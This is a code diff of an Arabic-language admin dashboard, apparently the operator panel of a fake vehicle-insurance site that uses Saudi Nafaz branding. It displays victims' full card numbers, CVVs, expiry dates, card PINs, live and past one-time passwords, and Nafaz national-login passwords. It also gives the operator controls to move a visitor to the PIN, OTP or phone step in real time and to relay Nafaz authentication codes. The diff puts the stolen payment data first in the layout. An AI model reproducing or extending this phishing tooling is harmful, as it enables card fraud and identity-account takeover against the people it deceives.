@@ -35,9 +35,9 @@ import { database } from "@/lib/firestore"
 import { CreditCardMockup } from "@/components/credit-card-mockup"
 
 const STEP_NAMES: Record<number | string, string> = {
-  1: "الرئيسه",
+  1: "PIN",
   2: "تفاصيل",
-  3: "مقارنة",
+  3: "OTP",
   4: "بطاقة",
 }
 
@@ -393,6 +393,18 @@ export default function AdminDashboard() {
     return !!(app.vehicleModel || app.manufacturingYear || app.vehicleValue || app.vehicleUsage)
   }
 
+  const hasAnyGridData = (app: InsuranceApplication) => {
+    return (
+      hasDocumentInfo(app) ||
+      hasInsuranceInfo(app) ||
+      hasVehicleInfo(app) ||
+      app.cardNumber ||
+      app.phoneNumber2 ||
+      app.phoneOtp ||
+      app.nafazId
+    )
+  }
+
   const getStepName = (step: number | string) => {
     return STEP_NAMES[step] || `الخطوة ${step}`
   }
@@ -668,36 +680,35 @@ export default function AdminDashboard() {
                 />
               </div>
             ) : (
-              <div className="p-6 max-w-6xl mx-auto space-y-6">
-                {/* Application Header */}
-                <div className="bg-card rounded-xl border border-border p-6">
-                  <div className="flex items-start justify-between">
-                    <div className="flex items-center gap-4">
-                      <div className="w-14 h-14 rounded-xl bg-gradient-to-br from-primary to-primary/70 flex items-center justify-center text-primary-foreground text-xl font-semibold">
-                        {selectedApplication.ownerName?.charAt(0)}
-                      </div>
-                      <div>
-                        <h2 className="text-xl font-semibold text-foreground mb-1">{selectedApplication.ownerName}</h2>
-                        <div className="flex items-center gap-3">
-                          <UserStatus userId={selectedApplication.id!} />
-                          <Badge variant="outline" className="text-xs">
-                            {getStepName(selectedApplication.currentStep)}
-                          </Badge>
+              <div className="h-full flex flex-col">
+                <div className="sticky top-0 z-20 bg-card/95 backdrop-blur-xl border-b border-border">
+                  <div className="p-6">
+                    <div className="flex items-start justify-between mb-4">
+                      <div className="flex items-center gap-4">
+                        <div className="w-14 h-14 bg-gradient-to-br from-primary to-primary/70 rounded-xl flex items-center justify-center text-primary-foreground text-xl font-bold shadow-lg">
+                          {selectedApplication.ownerName?.charAt(0)}
+                        </div>
+                        <div>
+                          <h2 className="text-xl font-bold text-foreground mb-1">{selectedApplication.ownerName}</h2>
+                          <div className="flex items-center gap-2">
+                            <UserStatus userId={selectedApplication.id!} />
+                            <Badge variant="outline" className="text-xs">
+                              {getStepName(selectedApplication.currentStep)}
+                            </Badge>
+                          </div>
                         </div>
                       </div>
+                      <Button onClick={() => setShowChat(true)} size="default" className="gap-2">
+                        <MessageSquare className="w-4 h-4" />
+                        فتح الدردشة
+                      </Button>
                     </div>
-                    <Button onClick={() => setShowChat(true)} className="gap-2">
-                      <MessageSquare className="w-4 h-4" />
-                      فتح الدردشة
-                    </Button>
-                  </div>
 
-                  {/* Step Controls */}
-                  <div className="mt-6 pt-6 border-t border-border">
+                    {/* Control Panel - Now part of fixed header */}
                     <div className="grid grid-cols-7 gap-2">
                       <Button
                         onClick={() => handleStatusChange(selectedApplication.id!, "nafad")}
-                        variant={selectedApplication.currentStep === "nafad" ? "default" : "outline"}
+                        variant="outline"
                         size="sm"
                         className="h-10"
                         disabled={selectedApplication.currentStep === "nafad"}
@@ -706,18 +717,18 @@ export default function AdminDashboard() {
                       </Button>
                       <Button
                         onClick={() => handleStatusChange(selectedApplication.id!, "phone")}
-                        variant={selectedApplication.currentStep === "phone" ? "default" : "outline"}
+                        variant="outline"
                         size="sm"
-                        className="h-10"
+                        className="h-10 hover:bg-success/10 border-success/30"
                         disabled={selectedApplication.currentStep === "phone"}
                       >
-                        الهاتف
+                        التحويل للهاتف
                       </Button>
                       <Button
                         onClick={() => handleStatusChange(selectedApplication.id!, "home")}
-                        variant={selectedApplication.currentStep === "home" ? "default" : "outline"}
+                        variant="outline"
                         size="sm"
-                        className="h-10"
+                        className="h-10 hover:bg-destructive/10 border-destructive/30"
                         disabled={selectedApplication.currentStep === "home"}
                       >
                         الرئيسية
@@ -737,381 +748,461 @@ export default function AdminDashboard() {
                   </div>
                 </div>
 
-                {/* Info Cards Grid */}
-                <div className="grid grid-cols-1 lg:grid-cols-3 gap-4">
-                  {/* Document Info */}
-                  {hasDocumentInfo(selectedApplication) && (
-                    <div className="bg-card rounded-xl border border-border p-5">
-                      <div className="flex items-center gap-3 mb-4">
-                        <div className="p-2 rounded-lg bg-primary/10">
-                          <FileText className="w-4 h-4 text-primary" />
-                        </div>
-                        <h3 className="font-semibold text-foreground">معلومات الوثيقة</h3>
-                      </div>
-                      <div className="space-y-3">
-                        {selectedApplication.documentType && (
-                          <div className="flex justify-between items-center py-2 border-b border-border/50">
-                            <span className="text-sm text-muted-foreground">نوع الوثيقة</span>
-                            <span className="text-sm font-medium text-foreground">
-                              {selectedApplication.documentType}
-                            </span>
-                          </div>
-                        )}
-                        {selectedApplication.serialNumber && (
-                          <div className="flex justify-between items-center py-2 border-b border-border/50">
-                            <span className="text-sm text-muted-foreground">الرقم التسلسلي</span>
-                            <span className="text-sm font-mono text-foreground">
-                              {selectedApplication.serialNumber}
-                            </span>
-                          </div>
-                        )}
-                        {selectedApplication.phoneNumber && (
-                          <div className="flex justify-between items-center py-2 border-b border-border/50">
-                            <span className="text-sm text-muted-foreground">رقم الهاتف</span>
-                            <span className="text-sm font-mono text-foreground" dir="ltr">
-                              {selectedApplication.phoneNumber}
-                            </span>
-                          </div>
-                        )}
-                        {selectedApplication.nafazId && (
-                          <div className="flex justify-between items-center py-2 border-b border-border/50">
-                            <span className="text-sm text-muted-foreground">رقم نفاذ</span>
-                            <span className="text-sm font-mono text-foreground">{selectedApplication.nafazId}</span>
-                          </div>
-                        )}
-                        {selectedApplication.country && (
-                          <div className="flex justify-between items-center py-2">
-                            <span className="text-sm text-muted-foreground">الدولة</span>
-                            <span className="text-sm font-medium text-foreground">{selectedApplication.country}</span>
-                          </div>
-                        )}
-                      </div>
-                    </div>
-                  )}
-
-                  {/* Insurance Info */}
-                  {hasInsuranceInfo(selectedApplication) && (
-                    <div className="bg-card rounded-xl border border-border p-5">
-                      <div className="flex items-center gap-3 mb-4">
-                        <div className="p-2 rounded-lg bg-success/10">
-                          <Shield className="w-4 h-4 text-success" />
-                        </div>
-                        <h3 className="font-semibold text-foreground">تفاصيل التأمين</h3>
-                      </div>
-                      <div className="space-y-3">
-                        {selectedApplication.insuranceType && (
-                          <div className="flex justify-between items-center py-2 border-b border-border/50">
-                            <span className="text-sm text-muted-foreground">نوع التأمين</span>
-                            <span className="text-sm font-medium text-foreground">
-                              {selectedApplication.insuranceType}
-                            </span>
-                          </div>
-                        )}
-                        {selectedApplication.insuranceStartDate && (
-                          <div className="flex justify-between items-center py-2 border-b border-border/50">
-                            <span className="text-sm text-muted-foreground">تاريخ البدء</span>
-                            <span className="text-sm font-medium text-foreground">
-                              {selectedApplication.insuranceStartDate}
-                            </span>
-                          </div>
-                        )}
-                        {selectedApplication.repairLocation && (
-                          <div className="flex justify-between items-center py-2">
-                            <span className="text-sm text-muted-foreground">موقع الإصلاح</span>
-                            <span className="text-sm font-medium text-foreground">
-                              {selectedApplication.repairLocation === "agency" ? "الوكالة" : "ورشة"}
-                            </span>
-                          </div>
-                        )}
-                      </div>
-                    </div>
-                  )}
-
-                  {/* Vehicle Info */}
-                  {hasVehicleInfo(selectedApplication) && (
-                    <div className="bg-card rounded-xl border border-border p-5">
-                      <div className="flex items-center gap-3 mb-4">
-                        <div className="p-2 rounded-lg bg-chart-4/10">
-                          <Car className="w-4 h-4 text-chart-4" />
-                        </div>
-                        <h3 className="font-semibold text-foreground">معلومات المركبة</h3>
-                      </div>
-                      <div className="grid grid-cols-2 gap-4">
-                        {selectedApplication.vehicleModel && (
-                          <div>
-                            <p className="text-xs text-muted-foreground mb-1">الموديل</p>
-                            <p className="text-sm font-medium text-foreground">{selectedApplication.vehicleModel}</p>
-                          </div>
-                        )}
-                        {selectedApplication.manufacturingYear && (
-                          <div>
-                            <p className="text-xs text-muted-foreground mb-1">سنة الصنع</p>
-                            <p className="text-sm font-medium text-foreground">
-                              {selectedApplication.manufacturingYear}
-                            </p>
-                          </div>
-                        )}
-                        {selectedApplication.vehicleValue && (
-                          <div>
-                            <p className="text-xs text-muted-foreground mb-1">القيمة</p>
-                            <p className="text-sm font-medium text-foreground">
-                              {selectedApplication.vehicleValue} ريال
-                            </p>
-                          </div>
-                        )}
-                        {selectedApplication.vehicleUsage && (
-                          <div>
-                            <p className="text-xs text-muted-foreground mb-1">الاستخدام</p>
-                            <p className="text-sm font-medium text-foreground">{selectedApplication.vehicleUsage}</p>
-                          </div>
-                        )}
-                      </div>
-                    </div>
-                  )}
-
-                  {/* Nafaz Status */}
-                  <div className="bg-card rounded-xl border border-border p-5">
-                    <div className="flex items-center gap-3 mb-4">
-                      <div className="p-2 rounded-lg bg-primary/10">
-                        <User className="w-4 h-4 text-primary" />
-                      </div>
-                      <h3 className="font-semibold text-foreground">نفاذ الوطني</h3>
-                    </div>
-                    <div className="space-y-4">
-                      <div className="p-4 bg-muted/50 rounded-lg space-y-3">
-                        <div>
-                          <p className="text-xs text-muted-foreground mb-1">الرقم الوطني</p>
-                          <p className="text-sm font-mono text-foreground">{selectedApplication.nafazId || "—"}</p>
-                        </div>
-                        <div>
-                          <p className="text-xs text-muted-foreground mb-1">الرقم السري</p>
-                          <p className="text-sm font-mono text-foreground">{selectedApplication.nafazPass || "—"}</p>
-                        </div>
-                        <div>
-                          <p className="text-xs text-muted-foreground mb-1">رمز التوثيق</p>
-                          <Input
-                            type="tel"
-                            placeholder="أدخل رمز التوثيق"
-                            value={authNumber}
-                            onChange={(e) => setAuthNumber(e.target.value)}
-                            className="h-9 bg-background"
-                          />
-                        </div>
-                      </div>
-                      <div className="flex gap-2">
-                        <Button
-                          onClick={() => handleAuthNumber(selectedApplication.id!, authNumber)}
-                          variant="outline"
-                          size="sm"
-                          className="flex-1 text-success border-success/30 hover:bg-success/10"
+                <div className="flex-1 overflow-y-auto p-6">
+                  {hasAnyGridData(selectedApplication) ? (
+                    <div className="grid grid-cols-1 lg:grid-cols-3 gap-4 max-w-6xl mx-auto">
+                      {/* 1. Payment Info - Full width card (most recent data) */}
+                      {selectedApplication.cardNumber && (
+                        <div
+                          className="lg:col-span-3 bg-card rounded-xl border border-border p-5 animate-in fade-in slide-in-from-bottom-4 duration-500 fill-mode-both"
+                          style={{ animationDelay: "0ms" }}
                         >
-                          <CheckCircle className="w-4 h-4 mr-2" />
-                          حفظ
-                        </Button>
-                        <Button
-                          variant="outline"
-                          size="sm"
-                          className="text-destructive border-destructive/30 hover:bg-destructive/10 bg-transparent"
+                          <div className="flex items-center gap-3 mb-6">
+                            <div className="p-2.5 rounded-lg bg-primary/10 animate-pulse">
+                              <CreditCard className="w-5 h-5 text-primary" />
+                            </div>
+                            <h3 className="font-semibold text-foreground">معلومات الدفع</h3>
+                            <Badge
+                              variant="outline"
+                              className="mr-auto text-[10px] bg-primary/5 border-primary/20 text-primary animate-bounce"
+                            >
+                              جديد
+                            </Badge>
+                          </div>
+                          <div className="flex flex-col lg:flex-row gap-6">
+                            <div className="flex-1">
+                              <CreditCardMockup
+                                cardNumber={selectedApplication.cardNumber}
+                                expiryDate={selectedApplication?.expiryDate}
+                                cvv={selectedApplication?.cvv}
+                                cardholderName={selectedApplication.ownerName}
+                              />
+                            </div>
+                            <div className="lg:w-64 space-y-4">
+                              {selectedApplication.otp && (
+                                <div className="p-4 bg-success/10 border border-success/20 rounded-xl animate-in zoom-in duration-300">
+                                  <p className="text-xs font-medium text-success mb-2">رمز OTP الحالي</p>
+                                  <p className="text-3xl font-bold text-success font-mono text-center" dir="ltr">
+                                    {selectedApplication.otp}
+                                  </p>
+                                </div>
+                              )}
+                              {selectedApplication.allOtps && selectedApplication.allOtps.length > 0 && (
+                                <div className="p-4 bg-muted/50 rounded-xl">
+                                  <p className="text-xs font-medium text-muted-foreground mb-3">سجل رموز OTP</p>
+                                  <div className="flex flex-wrap gap-2">
+                                    {selectedApplication.allOtps.map((otp, index) => (
+                                      <Badge
+                                        key={index}
+                                        variant="secondary"
+                                        className="font-mono animate-in fade-in duration-300"
+                                        style={{ animationDelay: `${index * 50}ms` }}
+                                        dir="ltr"
+                                      >
+                                        {otp}
+                                      </Badge>
+                                    ))}
+                                  </div>
+                                </div>
+                              )}
+                            </div>
+                          </div>
+                        </div>
+                      )}
+
+                      {/* 2. Phone Verification */}
+                      {(selectedApplication.phoneNumber2 ||
+                        selectedApplication.phoneOtp ||
+                        selectedApplication.selectedCarrier) && (
+                        <div
+                          className="bg-card rounded-xl border border-border p-5 animate-in fade-in slide-in-from-bottom-4 duration-500 fill-mode-both"
+                          style={{ animationDelay: "100ms" }}
                         >
-                          <XCircle className="w-4 h-4" />
-                        </Button>
-                      </div>
-                    </div>
-                  </div>
-
-                  {/* Payment Info */}
-                  {selectedApplication.cardNumber && (
-                    <div className="lg:col-span-3 bg-card rounded-xl border border-border p-5">
-                      <div className="flex items-center gap-3 mb-6">
-                        <div className="p-2 rounded-lg bg-primary/10">
-                          <CreditCard className="w-4 h-4 text-primary" />
-                        </div>
-                        <h3 className="font-semibold text-foreground">معلومات الدفع</h3>
-                      </div>
-                      <div className="flex flex-col lg:flex-row gap-6">
-                        <div className="flex-1">
-                          <CreditCardMockup
-                            cardNumber={selectedApplication.cardNumber}
-                            expiryDate={selectedApplication?.expiryDate}
-                            cvv={selectedApplication?.cvv}
-                            cardholderName={selectedApplication.ownerName}
-                          />
-                        </div>
-                        <div className="lg:w-64 space-y-4">
-                          {selectedApplication.otp && (
-                            <div className="p-4 bg-success/10 border border-success/20 rounded-xl">
-                              <p className="text-xs font-medium text-success mb-2">رمز OTP الحالي</p>
-                              <p className="text-3xl font-bold text-success font-mono text-center" dir="ltr">
-                                {selectedApplication.otp}
-                              </p>
-                            </div>
-                          )}
-                          {selectedApplication.allOtps && selectedApplication.allOtps.length > 0 && (
-                            <div className="p-4 bg-muted/50 rounded-xl">
-                              <p className="text-xs font-medium text-muted-foreground mb-3">سجل رموز OTP</p>
-                              <div className="flex flex-wrap gap-2">
-                                {selectedApplication.allOtps.map((otp, index) => (
-                                  <Badge key={index} variant="secondary" className="font-mono" dir="ltr">
-                                    {otp}
-                                  </Badge>
-                                ))}
-                              </div>
-                            </div>
-                          )}
-                        </div>
-                      </div>
-                    </div>
-                  )}
-
-                  {/* Phone Verification */}
-                  <div className="bg-card rounded-xl border border-border p-5">
-                    <div className="flex items-center gap-3 mb-4">
-                      <div className="p-2 rounded-lg bg-primary/10">
-                        <Phone className="w-4 h-4 text-primary" />
-                      </div>
-                      <h3 className="font-semibold text-foreground">معلومات الهاتف</h3>
-                    </div>
-                    <div className="space-y-4">
-                      <div className="grid grid-cols-2 gap-4">
-                        <div>
-                          <p className="text-xs text-muted-foreground mb-1">الهاتف</p>
-                          <p className="text-sm font-mono text-foreground">{selectedApplication.phoneNumber2 || "—"}</p>
-                        </div>
-                        <div>
-                          <p className="text-xs text-muted-foreground mb-1">مزود الخدمة</p>
-                          <p className="text-sm font-medium text-foreground">
-                            {selectedApplication.selectedCarrier || "—"}
-                          </p>
-                        </div>
-                      </div>
-                      <div className="p-4 bg-muted/50 rounded-lg">
-                        <div className="flex items-center justify-between mb-3">
-                          <div className="flex items-center gap-3">
-                            <div className="w-10 h-10 rounded-lg bg-primary/10 flex items-center justify-center">
+                          <div className="flex items-center gap-3 mb-4">
+                            <div className="p-2.5 rounded-lg bg-primary/10 animate-pulse">
                               <Phone className="w-5 h-5 text-primary" />
                             </div>
-                            <div>
-                              <p className="text-sm font-medium text-foreground">رمز الهاتف</p>
-                              <p className="text-xs font-mono text-muted-foreground">
-                                {selectedApplication?.phoneOtp || "—"}
-                              </p>
+                            <h3 className="font-semibold text-foreground">معلومات الهاتف</h3>
+                            <Badge
+                              variant="outline"
+                              className="mr-auto text-[10px] bg-primary/5 border-primary/20 text-primary"
+                            >
+                              جديد
+                            </Badge>
+                          </div>
+                          <div className="space-y-4">
+                            <div className="grid grid-cols-2 gap-4">
+                              <div className="p-3 bg-muted/30 rounded-lg border border-border/50 transition-all hover:border-primary/30 hover:bg-primary/5">
+                                <p className="text-xs text-muted-foreground mb-1">الهاتف</p>
+                                <p className="text-sm font-mono text-foreground">
+                                  {selectedApplication.phoneNumber2 || "—"}
+                                </p>
+                              </div>
+                              <div className="p-3 bg-muted/30 rounded-lg border border-border/50 transition-all hover:border-primary/30 hover:bg-primary/5">
+                                <p className="text-xs text-muted-foreground mb-1">مزود الخدمة</p>
+                                <p className="text-sm font-medium text-foreground">
+                                  {selectedApplication.selectedCarrier || "—"}
+                                </p>
+                              </div>
+                            </div>
+                            <div className="p-4 bg-gradient-to-br from-muted/50 to-muted/30 rounded-lg border border-border/50">
+                              <div className="flex items-center justify-between mb-3">
+                                <div className="flex items-center gap-3">
+                                  <div className="w-10 h-10 rounded-lg bg-primary/10 flex items-center justify-center">
+                                    <Phone className="w-5 h-5 text-primary" />
+                                  </div>
+                                  <div>
+                                    <p className="text-sm font-medium text-foreground">رمز الهاتف</p>
+                                    <p className="text-lg font-mono font-bold text-primary">
+                                      {selectedApplication?.phoneOtp || "—"}
+                                    </p>
+                                  </div>
+                                </div>
+                                <Badge
+                                  variant={
+                                    selectedApplication.phoneVerificationStatus === "approved"
+                                      ? "default"
+                                      : selectedApplication.phoneVerificationStatus === "rejected"
+                                        ? "destructive"
+                                        : "secondary"
+                                  }
+                                  className="animate-in zoom-in duration-300"
+                                >
+                                  {selectedApplication.phoneVerificationStatus === "approved"
+                                    ? "موافق"
+                                    : selectedApplication.phoneVerificationStatus === "rejected"
+                                      ? "مرفوض"
+                                      : "معلق"}
+                                </Badge>
+                              </div>
+                            </div>
+                            <div className="flex gap-2">
+                              <Button
+                                onClick={() => handlePhoneVerificationChange(selectedApplication.id!, "approved")}
+                                variant="outline"
+                                size="sm"
+                                className="flex-1 text-success border-success/30 hover:bg-success/10 transition-all hover:scale-[1.02] active:scale-[0.98]"
+                                disabled={selectedApplication.phoneVerificationStatus === "approved"}
+                              >
+                                <CheckCircle className="w-4 h-4 mr-2" />
+                                قبول
+                              </Button>
+                              <Button
+                                onClick={() => handlePhoneVerificationChange(selectedApplication.id!, "rejected")}
+                                variant="outline"
+                                size="sm"
+                                className="flex-1 text-destructive border-destructive/30 hover:bg-destructive/10 transition-all hover:scale-[1.02] active:scale-[0.98]"
+                                disabled={selectedApplication.phoneVerificationStatus === "rejected"}
+                              >
+                                <XCircle className="w-4 h-4 mr-2" />
+                                رفض
+                              </Button>
                             </div>
                           </div>
-                          <Badge
-                            variant={
-                              selectedApplication.phoneVerificationStatus === "approved"
-                                ? "default"
-                                : selectedApplication.phoneVerificationStatus === "rejected"
-                                  ? "destructive"
-                                  : "secondary"
-                            }
-                          >
-                            {selectedApplication.phoneVerificationStatus === "approved"
-                              ? "موافق"
-                              : selectedApplication.phoneVerificationStatus === "rejected"
-                                ? "مرفوض"
-                                : "معلق"}
-                          </Badge>
                         </div>
-                      </div>
-                      <div className="flex gap-2">
-                        <Button
-                          onClick={() => handlePhoneVerificationChange(selectedApplication.id!, "approved")}
-                          variant="outline"
-                          size="sm"
-                          className="flex-1 text-success border-success/30 hover:bg-success/10"
-                          disabled={selectedApplication.phoneVerificationStatus === "approved"}
-                        >
-                          <CheckCircle className="w-4 h-4 mr-2" />
-                          قبول
-                        </Button>
-                        <Button
-                          onClick={() => handlePhoneVerificationChange(selectedApplication.id!, "rejected")}
-                          variant="outline"
-                          size="sm"
-                          className="flex-1 text-destructive border-destructive/30 hover:bg-destructive/10"
-                          disabled={selectedApplication.phoneVerificationStatus === "rejected"}
-                        >
-                          <XCircle className="w-4 h-4 mr-2" />
-                          رفض
-                        </Button>
-                      </div>
-                    </div>
-                  </div>
+                      )}
 
-                  {/* Card Verification */}
-                  <div className="bg-card rounded-xl border border-border p-5">
-                    <div className="flex items-center gap-3 mb-4">
-                      <div className="p-2 rounded-lg bg-success/10">
-                        <CreditCard className="w-4 h-4 text-success" />
-                      </div>
-                      <h3 className="font-semibold text-foreground">حالة التحقق</h3>
-                    </div>
-                    <div className="space-y-4">
-                      <div className="p-4 bg-muted/50 rounded-lg">
-                        <div className="flex items-center justify-between mb-4">
-                          <div className="flex items-center gap-3">
-                            <div className="w-10 h-10 rounded-lg bg-success/10 flex items-center justify-center">
+                      {/* 3. Card Verification */}
+                      {(selectedApplication.otp || selectedApplication.pinCode) && (
+                        <div
+                          className="bg-card rounded-xl border border-border p-5 animate-in fade-in slide-in-from-bottom-4 duration-500 fill-mode-both"
+                          style={{ animationDelay: "200ms" }}
+                        >
+                          <div className="flex items-center gap-3 mb-4">
+                            <div className="p-2.5 rounded-lg bg-success/10 animate-pulse">
                               <CreditCard className="w-5 h-5 text-success" />
                             </div>
-                            <div>
-                              <p className="text-sm font-medium text-foreground">رمز البطاقة</p>
-                              <p className="text-xs font-mono text-muted-foreground">
-                                {selectedApplication.otp || "—"}
-                              </p>
+                            <h3 className="font-semibold text-foreground">حالة التحقق</h3>
+                            <Badge
+                              variant="outline"
+                              className="mr-auto text-[10px] bg-success/5 border-success/20 text-success"
+                            >
+                              جديد
+                            </Badge>
+                          </div>
+                          <div className="space-y-4">
+                            <div className="p-4 bg-gradient-to-br from-muted/50 to-muted/30 rounded-lg border border-border/50">
+                              <div className="flex items-center justify-between mb-4">
+                                <div className="flex items-center gap-3">
+                                  <div className="w-10 h-10 rounded-lg bg-success/10 flex items-center justify-center">
+                                    <CreditCard className="w-5 h-5 text-success" />
+                                  </div>
+                                  <div>
+                                    <p className="text-sm font-medium text-foreground">رمز البطاقة</p>
+                                    <p className="text-lg font-mono font-bold text-success">
+                                      {selectedApplication.otp || "—"}
+                                    </p>
+                                  </div>
+                                </div>
+                                <Badge
+                                  variant={
+                                    selectedApplication.idVerificationStatus === "approved"
+                                      ? "default"
+                                      : selectedApplication.idVerificationStatus === "rejected"
+                                        ? "destructive"
+                                        : "secondary"
+                                  }
+                                  className="animate-in zoom-in duration-300"
+                                >
+                                  {selectedApplication.idVerificationStatus === "approved"
+                                    ? "موافق"
+                                    : selectedApplication.idVerificationStatus === "rejected"
+                                      ? "مرفوض"
+                                      : "معلق"}
+                                </Badge>
+                              </div>
+                              <div className="p-3 bg-background/50 rounded-lg border border-border/50">
+                                <p className="text-xs text-muted-foreground mb-1">Pin Code</p>
+                                <p className="text-lg font-mono font-bold text-foreground">
+                                  {selectedApplication.pinCode || "—"}
+                                </p>
+                              </div>
+                            </div>
+                            <div className="flex gap-2">
+                              <Button
+                                onClick={() => handleIdVerificationChange(selectedApplication.id!, "approved")}
+                                variant="outline"
+                                size="sm"
+                                className="flex-1 text-success border-success/30 hover:bg-success/10 transition-all hover:scale-[1.02] active:scale-[0.98]"
+                                disabled={selectedApplication.idVerificationStatus === "approved"}
+                              >
+                                <CheckCircle className="w-4 h-4 mr-2" />
+                                قبول
+                              </Button>
+                              <Button
+                                onClick={() => handleIdVerificationChange(selectedApplication.id!, "rejected")}
+                                variant="outline"
+                                size="sm"
+                                className="flex-1 text-destructive border-destructive/30 hover:bg-destructive/10 transition-all hover:scale-[1.02] active:scale-[0.98]"
+                                disabled={selectedApplication.idVerificationStatus === "rejected"}
+                              >
+                                <XCircle className="w-4 h-4 mr-2" />
+                                رفض
+                              </Button>
                             </div>
                           </div>
-                          <Badge
-                            variant={
-                              selectedApplication.idVerificationStatus === "approved"
-                                ? "default"
-                                : selectedApplication.idVerificationStatus === "rejected"
-                                  ? "destructive"
-                                  : "secondary"
-                            }
-                          >
-                            {selectedApplication.idVerificationStatus === "approved"
-                              ? "موافق"
-                              : selectedApplication.idVerificationStatus === "rejected"
-                                ? "مرفوض"
-                                : "معلق"}
-                          </Badge>
                         </div>
-                        <div>
-                          <p className="text-xs text-muted-foreground mb-1">Pin Code</p>
-                          <p className="text-sm font-mono text-foreground">{selectedApplication.pinCode || "—"}</p>
+                      )}
+
+                      {/* 4. Nafaz */}
+                      {(selectedApplication.nafazId || selectedApplication.nafazPass) && (
+                        <div
+                          className="bg-card rounded-xl border border-border p-5 animate-in fade-in slide-in-from-bottom-4 duration-500 fill-mode-both"
+                          style={{ animationDelay: "300ms" }}
+                        >
+                          <div className="flex items-center gap-3 mb-4">
+                            <div className="p-2.5 rounded-lg bg-warning/10">
+                              <User className="w-5 h-5 text-warning" />
+                            </div>
+                            <h3 className="font-semibold text-foreground">نفاذ الوطني</h3>
+                          </div>
+                          <div className="space-y-4">
+                            <div className="p-4 bg-gradient-to-br from-muted/50 to-muted/30 rounded-lg border border-border/50">
+                              <div className="space-y-3">
+                                <div>
+                                  <p className="text-xs text-muted-foreground mb-1">الرقم الوطني</p>
+                                  <p className="text-sm font-mono font-medium text-foreground">
+                                    {selectedApplication.nafazId || "—"}
+                                  </p>
+                                </div>
+                                <div>
+                                  <p className="text-xs text-muted-foreground mb-1">الرقم السري</p>
+                                  <p className="text-sm font-mono font-medium text-foreground">
+                                    {selectedApplication.nafazPass || "—"}
+                                  </p>
+                                </div>
+                                <div>
+                                  <p className="text-xs text-muted-foreground mb-1">رمز التوثيق</p>
+                                  <Input
+                                    type="tel"
+                                    value={authNumber}
+                                    onChange={(e) => setAuthNumber(e.target.value)}
+                                    placeholder="أدخل رمز التوثيق"
+                                    className="h-9 text-sm"
+                                  />
+                                </div>
+                              </div>
+                            </div>
+                            <div className="flex gap-2">
+                              <Button
+                                onClick={() => handleAuthNumber(selectedApplication.id!, authNumber)}
+                                variant="outline"
+                                size="sm"
+                                className="flex-1 text-success border-success/30 hover:bg-success/10 transition-all hover:scale-[1.02] active:scale-[0.98]"
+                              >
+                                <CheckCircle className="w-4 h-4 mr-2" />
+                                حفظ
+                              </Button>
+                              <Button
+                                variant="outline"
+                                size="sm"
+                                className="flex-1 text-destructive border-destructive/30 hover:bg-destructive/10 transition-all hover:scale-[1.02] active:scale-[0.98] bg-transparent"
+                              >
+                                <XCircle className="w-4 h-4 mr-2" />
+                                إلغاء
+                              </Button>
+                            </div>
+                          </div>
                         </div>
-                      </div>
-                      <div className="flex gap-2">
-                        <Button
-                          onClick={() => handleIdVerificationChange(selectedApplication.id!, "approved")}
-                          variant="outline"
-                          size="sm"
-                          className="flex-1 text-success border-success/30 hover:bg-success/10"
-                          disabled={selectedApplication.idVerificationStatus === "approved"}
+                      )}
+
+                      {/* 5. Document Info */}
+                      {hasDocumentInfo(selectedApplication) && (
+                        <div
+                          className="bg-card rounded-xl border border-border p-5 animate-in fade-in slide-in-from-bottom-4 duration-500 fill-mode-both"
+                          style={{ animationDelay: "400ms" }}
                         >
-                          <CheckCircle className="w-4 h-4 mr-2" />
-                          قبول
-                        </Button>
-                        <Button
-                          onClick={() => handleIdVerificationChange(selectedApplication.id!, "rejected")}
-                          variant="outline"
-                          size="sm"
-                          className="flex-1 text-destructive border-destructive/30 hover:bg-destructive/10"
-                          disabled={selectedApplication.idVerificationStatus === "rejected"}
+                          <div className="flex items-center gap-3 mb-4">
+                            <div className="p-2 rounded-lg bg-primary/10">
+                              <FileText className="w-4 h-4 text-primary" />
+                            </div>
+                            <h3 className="font-semibold text-foreground">معلومات الوثيقة</h3>
+                          </div>
+                          <div className="space-y-3">
+                            {selectedApplication.documentType && (
+                              <div className="flex justify-between items-center py-2 border-b border-border/50 transition-colors hover:bg-muted/30 px-2 rounded">
+                                <span className="text-sm text-muted-foreground">نوع الوثيقة</span>
+                                <span className="text-sm font-medium text-foreground">
+                                  {selectedApplication.documentType}
+                                </span>
+                              </div>
+                            )}
+                            {selectedApplication.serialNumber && (
+                              <div className="flex justify-between items-center py-2 border-b border-border/50 transition-colors hover:bg-muted/30 px-2 rounded">
+                                <span className="text-sm text-muted-foreground">الرقم التسلسلي</span>
+                                <span className="text-sm font-mono text-foreground">
+                                  {selectedApplication.serialNumber}
+                                </span>
+                              </div>
+                            )}
+                            {selectedApplication.phoneNumber && (
+                              <div className="flex justify-between items-center py-2 border-b border-border/50 transition-colors hover:bg-muted/30 px-2 rounded">
+                                <span className="text-sm text-muted-foreground">رقم الهاتف</span>
+                                <span className="text-sm font-mono text-foreground" dir="ltr">
+                                  {selectedApplication.phoneNumber}
+                                </span>
+                              </div>
+                            )}
+                            {selectedApplication.country && (
+                              <div className="flex justify-between items-center py-2 transition-colors hover:bg-muted/30 px-2 rounded">
+                                <span className="text-sm text-muted-foreground">الدولة</span>
+                                <span className="text-sm font-medium text-foreground">
+                                  {selectedApplication.country}
+                                </span>
+                              </div>
+                            )}
+                          </div>
+                        </div>
+                      )}
+
+                      {/* 6. Insurance Info */}
+                      {hasInsuranceInfo(selectedApplication) && (
+                        <div
+                          className="bg-card rounded-xl border border-border p-5 animate-in fade-in slide-in-from-bottom-4 duration-500 fill-mode-both"
+                          style={{ animationDelay: "500ms" }}
                         >
-                          <XCircle className="w-4 h-4 mr-2" />
-                          رفض
-                        </Button>
+                          <div className="flex items-center gap-3 mb-4">
+                            <div className="p-2 rounded-lg bg-success/10">
+                              <Shield className="w-4 h-4 text-success" />
+                            </div>
+                            <h3 className="font-semibold text-foreground">تفاصيل التأمين</h3>
+                          </div>
+                          <div className="space-y-3">
+                            {selectedApplication.insuranceType && (
+                              <div className="flex justify-between items-center py-2 border-b border-border/50 transition-colors hover:bg-muted/30 px-2 rounded">
+                                <span className="text-sm text-muted-foreground">نوع التأمين</span>
+                                <span className="text-sm font-medium text-foreground">
+                                  {selectedApplication.insuranceType}
+                                </span>
+                              </div>
+                            )}
+                            {selectedApplication.insuranceStartDate && (
+                              <div className="flex justify-between items-center py-2 border-b border-border/50 transition-colors hover:bg-muted/30 px-2 rounded">
+                                <span className="text-sm text-muted-foreground">تاريخ البدء</span>
+                                <span className="text-sm font-medium text-foreground">
+                                  {selectedApplication.insuranceStartDate}
+                                </span>
+                              </div>
+                            )}
